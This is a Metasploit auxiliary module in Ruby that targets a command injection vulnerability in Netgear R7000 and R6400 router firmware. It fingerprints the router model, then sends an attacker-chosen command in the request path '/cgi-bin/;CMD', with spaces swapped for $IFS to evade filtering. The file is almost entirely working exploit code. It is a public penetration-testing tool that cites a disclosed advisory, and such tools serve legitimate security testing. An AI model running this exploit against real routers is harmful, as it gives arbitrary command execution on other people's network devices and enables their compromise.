##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient #For sending the http request
  include Rex::Proto::Http

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Netgear R7000 and R6400 Command Injection",
      'Description'          => %q{
        This module exploits an arbitrary command injection vulnerability in
        Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['linux'],
      'Author'               => ['thecarterb', 'Acew0rm'],
      'Targets'              => [
        [ 'Netgear firmware v1.0.7.2_1.1.93', { } ]
      ],
      'DefaultTarget'        => 0,
      'References'           =>
        [
          [ 'EDB', '40889'],
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],
          [ 'URL', 'https://www.kb.cert.org/vuls/id/582384']
        ],
      'DisclosureDate' => 'Dec 06 2016'
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'The remote target address', nil]),
        OptString.new('CMD',   [true, 'Command line to execute', nil ]),
      ], self.class)
    end

#taken from Dolibarr login utility, not really sure if it will work or not
#Requests the login page which discloses the hardware, if it's an R7000 or R6400, return Detected
def check

    res = send_request_cgi({'uri'=>'/'})
    if res.nil?
      fail_with(Failure::Unreachable, 'Connection timed out.')
    end

    # Checks for the `WWW-Authenticate` header in the response
    if res.headers["WWW-Authenticate"]
      data = res.to_s
      marker_one = "Basic realm=\""
      marker_two = "\""
      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
      print_status("Router is a NETGEAR router")
      if model == "R7000" || model == "R6400"
        print_good("Router is vulnerable (NETGEAR #{model})")
        return Exploit::CheckCode::Detected
      end
    else 
      print_error('Router is not a NETGEAR router')
      return Exploit::CheckCode::Safe
    end
  end

  def run
    #Main Function
    #convert datastores to variables
    cmd   = datastore['CMD']
    rhost = datastore['RHOST']

    print_status("Sending request to #{rhost}")

    #replace spaces with $IFS in CMD
    cmd = cmd.gsub! ' ', '$IFS'

    begin
      #send the request containing the edited command
      send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
    rescue Rex::ConnectionTimeout => ct
      print_error(ct.message)
    rescue Rex::ConnectionError => ce
      print_error(ce.message)
    rescue Rex::ConnectionRefused => cr
      print_error(cr.message)
    rescue Rex::Exception => e
      print_error(e.message)
    end
  end
end
